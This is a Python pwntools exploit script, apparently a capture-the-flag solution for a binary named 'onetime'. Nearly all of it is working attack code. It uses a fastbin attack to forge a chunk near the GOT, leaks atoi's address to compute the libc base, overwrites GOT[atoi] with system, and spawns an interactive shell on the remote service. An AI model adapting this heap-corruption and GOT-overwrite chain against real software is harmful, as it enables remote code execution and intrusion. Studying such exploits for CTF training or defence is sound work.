#!/usr/bin/env python3
from pwn import *
# context.log_level = "debug" # enable to see debug info

# to test locally, use process("./onetime")
p = remote("server_ip", 31053)
libc = ELF("./onetime.so")  # should be in the same directory

# wrap the interaction with menu
def cmd(c):
    p.recvuntil("your choice >>\n")
    p.sendline(str(c))

# ========================
# Stage 1: exploit fastbin attack to leak the address of atoi
# ========================

# 1. allocate one chunk
cmd(1)

# 2. free the chunk, which will be inserted to fastbin link
cmd(4)

# 3. rewrite the first 8 bytes of the chunk through payload, 
#    which points the fd to a controled address (0x60208d)
cmd(2)
p.recvuntil("fill content:")
# 0x60208d is the address of a valid fake chunk (0x60207d is also ok, then offset_to_chunk should be 0x1b)
payload = p64(0x60208d)
p.sendline(payload)

# 4. allocate one chunk again, where fastbin will return the just freed chunk
#    now, the head of fastbin link has been rewriten with our fake fd (0x60208d)
cmd(1)

# 5. allocate another chunk, we will get the chunk that the fake fd points to
cmd(5)
p.recvuntil("Hero! Leave your name:")
# points p to GOT[atoi]ï¼š
#  - fill the first 0xb bytes with 0, to align with the chunk size position and reset has_2 to zero at the same time!
#  - then write p64(0x602058), pointing p to GOT[atoi]
#  - the last two p64(0) is not necessary, they will reset all has_N to zero
offset_to_size = 0xb
p.send(b"\x00" * offset_to_size + p64(0x602058) + p64(0) * 2)  # 11 + 8 + 8 * 2 = 35, maximum writable are 0x40 bytes

# 6. print p in string format, which is actually printing the real address of atoi through jumping from GOT
cmd(3)
# 0-4 is "data:", we only process the received 5-11 bytes as address of atoi, and completing it with two 0
leak = u64((p.recvuntil("your choice >>\n")[5:11]).ljust(8, b'\x00'))
log.info("Leaked address: " + hex(leak))

# calc libc_base and address of system
libc_base = leak - libc.sym['atoi']
log.info("libc base: " + hex(libc_base))
sys_addr = libc_base + libc.symbols['system']

# ========================
# Stage 2: rewrite GOT, replace atoi with system
# ========================

# use the previously constructed fastbin attack chain, we rewrite the GOT[atoi] with sys_addr
p.send(b"2")
p.recvuntil("fill content:")
# construct payload to rewrite GOT[atoi] to system address
payload = p64(sys_addr)
p.send(payload)

# when calling atoi, it actually calling system, with param 'sh'
cmd('sh')
p.interactive()